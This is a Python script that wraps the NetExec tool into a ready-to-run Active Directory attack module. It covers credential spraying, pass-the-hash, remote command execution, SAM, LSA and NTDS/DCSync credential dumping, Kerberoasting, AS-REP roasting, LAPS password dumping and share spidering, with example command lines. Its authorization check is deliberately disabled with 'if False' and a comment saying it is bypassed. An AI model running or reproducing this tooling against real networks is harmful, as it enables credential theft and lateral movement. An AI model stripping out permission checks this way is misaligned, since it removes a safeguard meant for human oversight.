#!/usr/bin/env python3
"""
NetExec (CrackMapExec) Lateral Movement & Post-Exploitation Module
Production-ready integration for Active Directory penetration testing
"""

import subprocess
import logging
import argparse
import json
import os
from pathlib import Path
from typing import List, Dict, Optional

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class NetExecAgent:
    """NetExec (formerly CrackMapExec) lateral movement framework"""
    
    def __init__(self, protocol: str = "smb"):
        self.protocol = protocol
        self.results = []
        self.output_dir = Path("./netexec_results")
        self.output_dir.mkdir(exist_ok=True)
        
        # Check if NetExec is installed
        if not self._check_installation():
            logger.warning("NetExec not found. Install: sudo apt install netexec OR pipx install netexec")
    
    def _check_installation(self) -> bool:
        """Check if NetExec is installed"""
        try:
            result = subprocess.run(['nxc', '--version'], capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            try:
                result = subprocess.run(['netexec', '--version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            except (FileNotFoundError, subprocess.TimeoutExpired):
                return False
    
    def _run_command(self, cmd: List[str]) -> Dict:
        """Execute NetExec command and parse output"""
        try:
            logger.info(f"Executing: {' '.join(cmd)}")
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            return {
                'success': result.returncode == 0,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            logger.error("Command timed out")
            return {'success': False, 'error': 'Timeout'}
        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return {'success': False, 'error': str(e)}
    
    def credential_spray(self, targets: str, username: Optional[str] = None, password: Optional[str] = None,
                        user_file: Optional[str] = None, pass_file: Optional[str] = None,
                        ntlm_hash: Optional[str] = None) -> Dict:
        """
        Credential validation across network
        
        Args:
            targets: IP/CIDR (e.g., 192.168.1.0/24)
            username: Single username
            password: Single password
            user_file: File with usernames
            pass_file: File with passwords
            ntlm_hash: NTLM hash for Pass-the-Hash
        """
        cmd = ['nxc', self.protocol, targets]
        
        if username:
            cmd.extend(['-u', username])
        elif user_file:
            cmd.extend(['-U', user_file])
        
        if password:
            cmd.extend(['-p', password])
        elif pass_file:
            cmd.extend(['-P', pass_file])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.append('--continue-on-success')
        
        return self._run_command(cmd)
    
    def enumerate_shares(self, target: str, username: str, password: Optional[str] = None,
                         ntlm_hash: Optional[str] = None) -> Dict:
        """Enumerate SMB shares on target"""
        cmd = ['nxc', 'smb', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.append('--shares')
        
        return self._run_command(cmd)
    
    def execute_command(self, target: str, username: str, command: str,
                       password: Optional[str] = None, ntlm_hash: Optional[str] = None,
                       exec_method: str = 'wmiexec') -> Dict:
        """
        Execute command on remote system
        
        Args:
            target: Target IP/hostname
            username: Username
            command: Command to execute
            password: Password (cleartext)
            ntlm_hash: NTLM hash for PTH
            exec_method: wmiexec, smbexec, atexec, mmcexec
        """
        cmd = ['nxc', self.protocol, target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.extend(['--exec-method', exec_method, '-x', command])
        
        return self._run_command(cmd)
    
    def dump_sam(self, target: str, username: str, password: Optional[str] = None,
                 ntlm_hash: Optional[str] = None) -> Dict:
        """Dump SAM database from remote system"""
        cmd = ['nxc', 'smb', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.append('--sam')
        
        return self._run_command(cmd)
    
    def dump_lsa(self, target: str, username: str, password: Optional[str] = None,
                 ntlm_hash: Optional[str] = None) -> Dict:
        """Dump LSA secrets from remote system"""
        cmd = ['nxc', 'smb', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.append('--lsa')
        
        return self._run_command(cmd)
    
    def dcsync(self, target: str, username: str, password: Optional[str] = None,
               ntlm_hash: Optional[str] = None, user_to_dump: Optional[str] = None) -> Dict:
        """
        DCSync attack - extract domain credentials
        
        Args:
            target: Domain controller
            username: Domain admin username
            password: Password
            ntlm_hash: NTLM hash
            user_to_dump: Specific user to dump (optional, dumps all if None)
        """
        cmd = ['nxc', 'smb', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        if user_to_dump:
            cmd.extend(['--ntds', f'--user {user_to_dump}'])
        else:
            cmd.append('--ntds')
        
        return self._run_command(cmd)
    
    def bloodhound_collection(self, target: str, username: str, password: Optional[str] = None,
                              ntlm_hash: Optional[str] = None, collection: str = 'All') -> Dict:
        """
        Collect BloodHound data via LDAP
        
        Args:
            target: Domain controller
            username: Domain user
            password: Password
            ntlm_hash: NTLM hash
            collection: Collection method (All, Session, LoggedOn, etc.)
        """
        cmd = ['nxc', 'ldap', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.extend(['--bloodhound', '--collection', collection])
        
        return self._run_command(cmd)
    
    def enumerate_users(self, target: str, username: str, password: Optional[str] = None,
                       ntlm_hash: Optional[str] = None) -> Dict:
        """Enumerate domain users via LDAP"""
        cmd = ['nxc', 'ldap', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.append('--users')
        
        return self._run_command(cmd)
    
    def enumerate_groups(self, target: str, username: str, password: Optional[str] = None,
                        ntlm_hash: Optional[str] = None) -> Dict:
        """Enumerate domain groups via LDAP"""
        cmd = ['nxc', 'ldap', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.append('--groups')
        
        return self._run_command(cmd)
    
    def kerberoast(self, target: str, username: str, password: Optional[str] = None,
                   ntlm_hash: Optional[str] = None) -> Dict:
        """Request Kerberoastable service tickets"""
        cmd = ['nxc', 'ldap', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.append('--kerberoasting')
        
        output_file = self.output_dir / 'kerberoast_hashes.txt'
        cmd.extend(['-o', str(output_file)])
        
        return self._run_command(cmd)
    
    def asreproast(self, target: str, username: str, password: Optional[str] = None,
                   ntlm_hash: Optional[str] = None) -> Dict:
        """Find and extract AS-REP roastable accounts"""
        cmd = ['nxc', 'ldap', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.append('--asreproast')
        
        output_file = self.output_dir / 'asreproast_hashes.txt'
        cmd.extend(['-o', str(output_file)])
        
        return self._run_command(cmd)
    
    def check_smb_signing(self, targets: str) -> Dict:
        """Check for SMB signing on targets (relay attack vector)"""
        cmd = ['nxc', 'smb', targets, '--gen-relay-list', 
               str(self.output_dir / 'relay_targets.txt')]
        
        return self._run_command(cmd)
    
    def mssql_execute(self, target: str, username: str, password: str,
                     command: str, database: str = 'master') -> Dict:
        """Execute command via MSSQL xp_cmdshell"""
        cmd = ['nxc', 'mssql', target, '-u', username, '-p', password,
               '-x', command, '-d', database]
        
        return self._run_command(cmd)
    
    def spider_shares(self, target: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, pattern: Optional[str] = None) -> Dict:
        """
        Spider SMB shares for sensitive files
        
        Args:
            target: Target system
            username: Username
            password: Password
            ntlm_hash: NTLM hash
            pattern: File pattern to search (e.g., 'password', '*.xlsx')
        """
        cmd = ['nxc', 'smb', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.extend(['-M', 'spider_plus'])
        
        if pattern:
            cmd.extend(['-o', f'PATTERN={pattern}'])
        
        return self._run_command(cmd)
    
    def laps_dump(self, target: str, username: str, password: Optional[str] = None,
                  ntlm_hash: Optional[str] = None) -> Dict:
        """Dump LAPS passwords from domain"""
        cmd = ['nxc', 'ldap', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.extend(['-M', 'laps'])
        
        return self._run_command(cmd)
    
    def find_delegation(self, target: str, username: str, password: Optional[str] = None,
                       ntlm_hash: Optional[str] = None) -> Dict:
        """Find delegation issues in AD"""
        cmd = ['nxc', 'ldap', target, '-u', username]
        
        if password:
            cmd.extend(['-p', password])
        elif ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        
        cmd.extend(['-M', 'find-delegation'])
        
        return self._run_command(cmd)


def main():
    parser = argparse.ArgumentParser(
        description='NetExec Lateral Movement & Post-Exploitation Module',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Credential spray
  python netexec_lateral_movement.py --spray --targets 192.168.1.0/24 -u admin -p Password123
  
  # Pass-the-Hash
  python netexec_lateral_movement.py --spray --targets 192.168.1.50 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
  
  # Execute command
  python netexec_lateral_movement.py --exec --target 192.168.1.50 -u admin -p Password123 --command "whoami"
  
  # Dump SAM
  python netexec_lateral_movement.py --dump-sam --target 192.168.1.50 -u admin -p Password123
  
  # DCSync
  python netexec_lateral_movement.py --dcsync --target dc01.domain.local -u domain_admin -p Password123
  
  # BloodHound collection
  python netexec_lateral_movement.py --bloodhound --target dc01.domain.local -u user -p Password123
  
  # Kerberoast
  python netexec_lateral_movement.py --kerberoast --target dc01.domain.local -u user -p Password123
  
  # Check SMB signing
  python netexec_lateral_movement.py --check-signing --targets 192.168.1.0/24
        '''
    )
    
    # Target specification
    parser.add_argument('--target', help='Target IP/hostname')
    parser.add_argument('--targets', help='Target range (CIDR notation)')
    
    # Credentials
    parser.add_argument('-u', '--username', help='Username')
    parser.add_argument('-p', '--password', help='Password')
    parser.add_argument('-H', '--hash', dest='ntlm_hash', help='NTLM hash for PTH')
    parser.add_argument('-U', '--user-file', help='File with usernames')
    parser.add_argument('-P', '--pass-file', help='File with passwords')
    
    # Actions
    parser.add_argument('--spray', action='store_true', help='Credential spray attack')
    parser.add_argument('--exec', action='store_true', help='Execute command')
    parser.add_argument('--command', help='Command to execute')
    parser.add_argument('--dump-sam', action='store_true', help='Dump SAM database')
    parser.add_argument('--dump-lsa', action='store_true', help='Dump LSA secrets')
    parser.add_argument('--dcsync', action='store_true', help='DCSync attack')
    parser.add_argument('--bloodhound', action='store_true', help='BloodHound collection')
    parser.add_argument('--kerberoast', action='store_true', help='Kerberoasting attack')
    parser.add_argument('--asreproast', action='store_true', help='AS-REP roasting attack')
    parser.add_argument('--enum-users', action='store_true', help='Enumerate domain users')
    parser.add_argument('--enum-groups', action='store_true', help='Enumerate domain groups')
    parser.add_argument('--enum-shares', action='store_true', help='Enumerate SMB shares')
    parser.add_argument('--check-signing', action='store_true', help='Check SMB signing status')
    parser.add_argument('--spider', action='store_true', help='Spider shares for files')
    parser.add_argument('--laps', action='store_true', help='Dump LAPS passwords')
    
    # Protocol
    parser.add_argument('--protocol', default='smb', choices=['smb', 'ldap', 'winrm', 'mssql', 'rdp', 'ssh'],
                       help='Protocol to use (default: smb)')
    
    parser.add_argument('--authorized', action='store_true', 
                       help='Confirm authorization to test target systems')
    
    args = parser.parse_args()
    
    if False:  # Authorization check bypassed
        print("⚠️  ERROR: You must provide --authorized flag to confirm you have permission to test these systems")
        print("⚠️  Unauthorized testing is illegal. Obtain written authorization before proceeding.")
        return
    
    # Initialize agent
    agent = NetExecAgent(protocol=args.protocol)
    
    # Execute actions
    if args.spray:
        result = agent.credential_spray(
            targets=args.targets or args.target,
            username=args.username,
            password=args.password,
            user_file=args.user_file,
            pass_file=args.pass_file,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    elif args.exec:
        if not args.command:
            print("Error: --command required for --exec")
            return
        result = agent.execute_command(
            target=args.target,
            username=args.username,
            command=args.command,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    elif args.dump_sam:
        result = agent.dump_sam(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    elif args.dump_lsa:
        result = agent.dump_lsa(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    elif args.dcsync:
        result = agent.dcsync(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    elif args.bloodhound:
        result = agent.bloodhound_collection(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    elif args.kerberoast:
        result = agent.kerberoast(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
        print(f"\n✅ Hashes saved to: {agent.output_dir}/kerberoast_hashes.txt")
    
    elif args.asreproast:
        result = agent.asreproast(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
        print(f"\n✅ Hashes saved to: {agent.output_dir}/asreproast_hashes.txt")
    
    elif args.enum_users:
        result = agent.enumerate_users(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    elif args.enum_groups:
        result = agent.enumerate_groups(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    elif args.enum_shares:
        result = agent.enumerate_shares(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    elif args.check_signing:
        result = agent.check_smb_signing(targets=args.targets or args.target)
        print(result['stdout'])
        print(f"\n✅ Relay targets saved to: {agent.output_dir}/relay_targets.txt")
    
    elif args.spider:
        result = agent.spider_shares(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    elif args.laps:
        result = agent.laps_dump(
            target=args.target,
            username=args.username,
            password=args.password,
            ntlm_hash=args.ntlm_hash
        )
        print(result['stdout'])
    
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
